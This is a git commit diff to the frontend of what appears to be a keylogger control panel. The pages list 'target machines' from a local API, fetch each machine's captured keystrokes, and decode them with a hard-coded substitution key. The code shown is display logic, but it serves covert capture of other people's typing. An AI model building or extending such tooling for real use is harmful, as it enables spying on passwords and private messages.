9833b7ea3c7ba2fe82a39d6499ed85b7b4424660
YeruhamMendelson <y0583207549@gmail.com>
2025-02-24 17:45:57 +0200

    js v 2

--- frontend/8200p2.js
+++ frontend/8200p2.js
@@ -11,7 +11,7 @@ fetch("http://127.0.0.1:5000/api/get_target_machines_list").then(
                 console.log(item)
                 const new_element = document.createElement("a")
                 const element = document.getElementById("data")
-                new_element.href = '8200p3.html'
+                new_element.href = `8200p3.html?computer=${item}`
                 new_element.setAttribute('class', 'button1')
                 new_element.textContent = item
                 console.log(new_element)
--- frontend/8200p3.js
+++ frontend/8200p3.js
@@ -7,18 +7,23 @@ console.log(allCharacters);
 const key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*', 'L', 'f', '7', 'g', '$', '!', 'V', '_', 'Z', 'O', 'X', '1', 'k', '?', '(', '\\', 'N', ':', 'e', 'p', '>', '`', 'h', '^', 'I', '#', 'a', 'Y', '"', 'l', 'Q', '[', ' ', 'C', 'J', '+', 'T', 's', '/', 'i', 't', 'S', ']', 'w', 'u', ')', 'A', 'F', '{', ',', '8', 'R', '2', '.', 'o', 'b', 'r', "'", '%', 'c', '&', 'D', ';', '<', '9', '4', 'd', 'z', '|', 'y', '}', 'j', 'G', '6', 'M', '~', 'v', 'B', 'W', 'q', 'K']
 console.log(key.length)
 const urlparams =  new URLSearchParams(window.location.search)
+console.log(urlparams)
 const computer = urlparams.get("computer")
 console.log("computer:::::::",computer)
+const h1 = document.getElementById("h1")
+h1.textContent = computer
 
-fetch("http://127.0.0.1:5000/api/get_keystrokes?" + computer).then(
+fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
     response => response.json().then(
         dat => {
             console.log(dat)
             dat.data.forEach(item => {
-                console.log(item.decrypted_words)
+                // console.log(item.decrypted_words)
                 const decrypted = deciphering(item.decrypted_words)
-                const new_element = document.createElement("p")
-                new_element.textContent = decrypted
+                const new_element = document.createElement("h3")
+                new_element.setAttribute('class', 'the_data')
+                new_element.appendChild(decrypted)
+                // new_element.textContent = decrypted
                 document.body.appendChild(new_element)
              
             });
@@ -27,19 +32,21 @@ fetch("http://127.0.0.1:5000/api/get_keystrokes?" + computer).then(
     )
 )
 const deciphering = (text) => {
-    console.log("^^^^^^^^^^^^^^^^^^^^^")
+    let new_d = document.createElement("div")
+    let new_p = document.createElement("p")
     let decrypted = ""
     for (let i = 0; i < text.length; i++){
         let char = allCharacters[key.indexOf(text[i])]
         if (char != undefined){
-        decrypted += char
+            decrypted += char
         }else{
-            decrypted += "\n"
+            new_p.textContent += decrypted
+            new_d.appendChild(new_p)
+            new_p = document.createElement("p")
+            decrypted = ""
         }
     }
     console.log(decrypted)
-    return decrypted
+    return new_d
 }
 
-const myString = "שורה ראשונה\nשורה שניה";
-console.log(myString);
